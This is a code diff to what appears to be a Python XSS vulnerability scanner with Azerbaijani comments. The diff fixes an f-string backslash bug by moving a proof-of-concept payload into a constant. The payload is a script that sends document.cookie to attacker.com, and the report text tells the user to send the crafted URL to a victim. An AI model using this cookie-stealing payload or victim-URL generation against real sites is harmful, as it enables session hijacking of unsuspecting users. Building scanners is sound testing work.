@@ -51,6 +51,10 @@ MARKER_PAYLOADS = [
     f"'{MARKER}'",
 ]
 
+# BUG FIX 1: f-string içində backslash işlətmək olmaz (Python 3.11),
+# ona görə XSS PoC payloadu ayrı dəyişəndə saxlanılır.
+XSS_POC_PAYLOAD = '<script>document.location="https://attacker.com/steal?c="+document.cookie</script>'
+
 
 class XSSScanner:
     def __init__(self, http_client):
@@ -82,7 +86,6 @@ class XSSScanner:
 
     def _is_executable(self, payload: str, response_text: str) -> bool:
         """Payload execution context-də mi?"""
-        # Script tag-ları saxlanılıbsa
         dangerous_patterns = [
             r'<script[^>]*>' + re.escape(MARKER),
             re.escape(payload),
@@ -108,9 +111,12 @@ class XSSScanner:
                 continue
 
             if self._check_reflection(payload, response.text):
-                # Severity təyin et
                 is_exec = self._is_executable(payload, response.text)
                 cvss = 7.2 if is_exec else 5.4
+
+                # BUG FIX 1: XSS_POC_PAYLOAD dəyişəni işlədilir,
+                # f-string içində birbaşa backslash-dırnaq yoxdur.
+                poc_url = self._inject_payload(url, param, XSS_POC_PAYLOAD)
 
                 vuln = Vulnerability(
                     vuln_type="XSS",
@@ -127,7 +133,7 @@ class XSSScanner:
                         f"Victim-ə bu URL-i göndər:\n"
                         f"{test_url}\n\n"
                         f"Daha effektiv payload:\n"
-                        f"{self._inject_payload(url, param, '<script>document.location=\"https://attacker.com/steal?c=\"+document.cookie</script>')}"
+                        f"{poc_url}"
                     ),
                     remediation=(
                         "1. User input-u HTML encode et (htmlspecialchars PHP-də)\n"
